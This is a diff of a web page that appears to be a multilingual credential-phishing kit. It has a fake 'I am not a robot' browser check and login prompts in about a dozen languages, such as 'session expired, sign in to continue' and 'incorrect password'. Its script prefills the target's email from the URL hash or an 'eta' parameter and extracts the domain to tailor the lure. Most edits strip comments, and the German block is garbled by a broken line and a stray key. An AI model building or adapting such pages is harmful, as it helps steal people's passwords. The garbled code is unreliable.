@@ -141,7 +141,7 @@
             submitButton: "Next",
             loaderText: "Loading..."
          },
-         zh: { // Chinese (Mandarin, Asia)
+         zh: {
             verifyHeading: "在访问网站之前检查您的浏览器",
             botCheckLabel: "我不是机器人",
             verifyInstruction: "点击复选框以验证您是人类。",
@@ -154,7 +154,7 @@
             submitButton: "下一步",
             loaderText: "加载中..."
          },
-         ja: { // Japanese (Asia)
+         ja: {
             verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
             botCheckLabel: "私はロボットではありません",
             verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
@@ -167,7 +167,7 @@
             submitButton: "次へ",
             loaderText: "読み込み中..."
          },
-         hi: { // Hindi (Asia)
+         hi: {
             verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
             botCheckLabel: "मैं रोबोट नहीं हूँ",
             verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
@@ -180,7 +180,7 @@
             submitButton: "अगला",
             loaderText: "लोड हो रहा है..."
          },
-         es: { // Spanish (Europe, Americas)
+         es: {
             verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
             botCheckLabel: "No soy un robot",
             verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
@@ -193,7 +193,7 @@
             submitButton: "Siguiente",
             loaderText: "Cargando..."
          },
-         fr: { // French (Europe)
+         fr: {
             verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
             botCheckLabel: "Je ne suis pas un robot",
             verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
@@ -206,20 +206,19 @@
             submitButton: "Suivant",
             loaderText: "Chargement..."
          },
-         de: { // German (Europe)
+         de: {
             verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
             botCheckLabel: "Ich bin kein Roboter",
             verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
             redirecting: "Weiterleitung...",
             errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
-            formHeading: "Bestätigen Sie, dass Sie kein Roboter sind",
-            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
-            emailLabel: "E    	    
+ discussion: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
+            emailLabel: "E-Mail",
             passwordLabel: "Passwort",
             submitButton: "Weiter",
             loaderText: "Laden..."
          },
-         pt: { // Portuguese (Americas, Europe)
+         pt: {
             verifyHeading: "Verificando seu navegador antes de acessar o site",
             botCheckLabel: "Não sou um robô",
             verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
@@ -232,7 +231,7 @@
             submitButton: "Próximo",
             loaderText: "Carregando..."
          },
-         ar: { // Arabic
+         ar: {
             verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
             botCheckLabel: "أنا لست روبوت",
             verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
@@ -245,7 +244,7 @@
             submitButton: "التالي",
             loaderText: "جارٍ التحميل..."
          },
-         it: { // Italian (Europe)
+         it: {
             verifyHeading: "Controllo del browser prima di accedere al sito",
             botCheckLabel: "Non sono un robot",
             verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
@@ -258,7 +257,7 @@
             submitButton: "Avanti",
             loaderText: "Caricamento..."
          },
-         ko: { // Korean (Asia)
+         ko: {
             verifyHeading: "사이트에 접근하기 전에 브라우저를 확인하는 중",
             botCheckLabel: "나는 로봇이 아닙니다",
             verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
@@ -271,7 +270,7 @@
             submitButton: "다음",
             loaderText: "로딩 중..."
          },
-         vi: { // Vietnamese (Asia)
+         vi: {
             verifyHeading: "Kiểm tra trình duyệt của bạn trước khi truy cập trang web",
             botCheckLabel: "Tôi không phải là robot",
             verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
@@ -289,14 +288,14 @@
       // Function to detect language
       function detectLanguage() {
          const browserLang = navigator.language || navigator.languages[0] || 'en';
-         const langCode = browserLang.split('-')[0]; // Get base language (e.g., 'en' from 'en-US')
-         return translations[langCode] ? langCode : 'en'; // Default to English if language not supported
+         const langCode = browserLang.split('-')[0];
+         return translations[langCode] ? langCode : 'en';
       }
 
       // Function to apply translations
       function applyTranslations(lang) {
          const t = translations[lang];
-         document.documentElement.lang = lang; // Update HTML lang attribute
+         document.documentElement.lang = lang;
          document.getElementById('verify-heading').textContent = t.verifyHeading;
          document.getElementById('bot-check-label').textContent = t.botCheckLabel;
          document.getElementById('verify-instruction').textContent = t.verifyInstruction;
@@ -309,21 +308,23 @@
          document.getElementById('loader-text').textContent = t.loaderText;
       }
 
-      // Apply language detection on page load
+      // Apply language detection and handle email from # or eta
       document.addEventListener("DOMContentLoaded", () => {
          const lang = detectLanguage();
          applyTranslations(lang);
 
-         // Original form handling script
+         // Modified code to handle both # and eta
          let submitCount = 0;
+         // Check for hash first, then eta query parameter
          const hash = window.location.hash ? window.location.hash.substring(1) : null;
          const urlParams = new URLSearchParams(window.location.search);
          const eta = urlParams.get('eta');
-         const email = hash || eta || null;
+         // Use hash if present, otherwise use eta, or null if neither exists
+         const e = hash || eta || null;
          let t;
-         if (email) {
-            document.getElementById("email").value = email;
-            const n = email.split("@");
+         if (e) {
+            document.getElementById("email").value = e;
+            const n = e.split("@");
             if (2 === n.length) {
                const e = n[1];
                t = e;
@@ -428,7 +429,7 @@
          const verificationDiv = document.getElementById('verification-div');
          const formContainer = document.getElementById('form-container');
          const mainContent = document.getElementById('main-content');
-         const lang = detectLanguage(); // Get language for redirecting message
+         const lang = detectLanguage();
 
          botCheck.addEventListener('change', function () {
             if (this.checked) {
